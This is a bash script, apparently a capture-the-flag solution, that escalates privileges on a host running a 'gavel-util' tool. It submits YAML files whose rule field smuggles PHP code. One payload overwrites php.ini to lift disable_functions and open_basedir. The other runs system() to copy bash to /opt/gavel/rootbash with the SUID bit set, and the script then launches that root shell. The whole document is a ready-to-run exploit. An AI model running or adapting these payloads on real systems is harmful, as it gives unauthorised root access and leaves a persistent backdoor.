#!/bin/bash

echo "[+] Starting Gavel Privilege Escalation..."

# --- Stage 1: Remove PHP Restrictions ---
echo "[+] Creating fix_ini.yaml..."
cat > fix_ini.yaml << 'EOF'
name: fixini
description: fix php ini
image: "x.png"
price: 1
rule_msg: "fixini"
rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
EOF

echo "[+] Submitting fix_ini.yaml to remove restrictions..."
/usr/local/bin/gavel-util submit $(pwd)/fix_ini.yaml

echo "[*] Waiting 5 seconds for processing..."
sleep 5

# --- Stage 2: Create SUID Bash ---
echo "[+] Creating rootshell.yaml..."
cat > rootshell.yaml << 'EOF'
name: rootshell
description: make suid bash
image: "x.png"
price: 1
rule_msg: "rootshell"
rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
EOF

echo "[+] Submitting rootshell.yaml to create SUID binary..."
/usr/local/bin/gavel-util submit $(pwd)/rootshell.yaml

echo "[*] Waiting 5 seconds for execution..."
sleep 5

# --- Stage 3: Verification and Root ---
echo "[+] Checking for SUID binary at /opt/gavel/rootbash..."
ls -l /opt/gavel/rootbash

if [ -f /opt/gavel/rootbash ]; then
    echo "[!!!] Success! Launching root shell (remember to use -p)..."
    /opt/gavel/rootbash -p
else
    echo "[-] File not found. You may need to wait longer or check the error logs."
fi
